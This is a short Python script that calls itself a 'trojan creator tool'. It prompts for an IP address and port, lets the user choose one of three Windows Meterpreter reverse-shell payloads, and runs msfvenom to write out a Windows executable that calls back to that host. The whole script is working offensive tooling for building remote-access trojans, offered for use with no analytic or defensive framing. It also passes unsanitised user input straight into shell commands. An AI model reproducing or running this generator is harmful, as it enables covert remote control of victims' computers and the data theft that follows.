#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN")
print("""
Welcome to the trojan creator tool

""")

ip=input("Local or Public Ip: ")
port=input("Enter the Port: ")
print("""
1)windows/meterpreter/reverse_tcp
2)windows/meterpreter/reverse_http
3)windows/meterpreter/reverse_https

""")
payload=input("Payload No: ")
filepath=input("Enter The FilePath: ")
if(payload=="1"):
	os.system("msfvenom -p  windows/meterpreter/reverse_tcp LHOST=" +ip + " LPORT=" +port + "  -f  exe -o " + filepath)
	
elif(payload=="2"):
	os.system("msfvenom -p  windows/meterpreter/reverse_http LHOST=" +ip + " LPORT=" +port + "  -f  exe -o " + filepath)

elif(payload=="3"):
	os.system("msfvenom -p  windows/meterpreter/reverse_https LHOST=" +ip + " LPORT=" +port + "  -f  exe -o " + filepath)
	
else:
	print("Invalid Payload No")
